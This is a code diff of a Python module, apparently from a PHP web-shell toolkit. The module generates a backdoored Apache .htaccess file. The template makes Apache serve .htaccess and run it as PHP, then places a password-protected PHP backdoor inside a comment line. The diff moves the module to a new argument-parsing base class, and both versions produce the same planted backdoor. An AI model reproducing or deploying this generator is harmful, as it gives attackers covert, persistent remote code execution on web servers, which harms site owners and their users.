@@ -1,38 +1,30 @@
-from core.parameters import ParametersList, Parameter as P
-from core.module import Module, ModuleException
+'''
+Created on 22/ago/2011
+
+@author: norby
+'''
+
+from modules.generate.php import Php as Phpgenerator
 from core.backdoor import Backdoor
 
-classname = 'Htaccess'
-
-class Htaccess(Module):
-
-    htaccess_template = '''
-<Files ~ "^\.ht">
+htaccess_template = '''<Files ~ "^\.ht">
     Order allow,deny
     Allow from all
 </Files>
 
 AddType application/x-httpd-php .htaccess
-# %%%PHPSHELL%%% #
+# %s #
 '''
 
+class Htaccess(Phpgenerator):
+    """Generate backdoored .htaccess."""
 
-    params = ParametersList('Create backdoor in .htaccess file (needs remote AllowOverride)', [],
-                        P(arg='path', help='Path', default='.htaccess', pos=0))
+    def _set_args(self):
+        self.argparser.add_argument('pass', help='Password')
+        self.argparser.add_argument('lpath', help='Path of generated backdoor', default= '.htaccess', nargs='?')
 
+    def _prepare_probe(self):
+        
+        self.args['encoded_backdoor'] = htaccess_template % Backdoor(self.args['pass']).backdoor.replace('\n', ' ')
 
-    def __init__( self, modhandler , url, password):
-        """ Avoid to load default interpreter """
-        self.backdoor = Backdoor(password)
-        self.modhandler = modhandler
-        self.modhandler.interpreter = True
-        self.password = password
-        self.name = self.__module__
-
-
-    def run_module( self, filename ):
-        out = file( filename, 'wt' )
-        out.write( self.htaccess_template.replace('%%%PHPSHELL%%%', str(self.backdoor).replace('\n',' ') ))
-        out.close()
-
-        self.mprint("[%s] Backdoor file '%s' created with password '%s'." % ( self.name, filename, self.password ))
+        
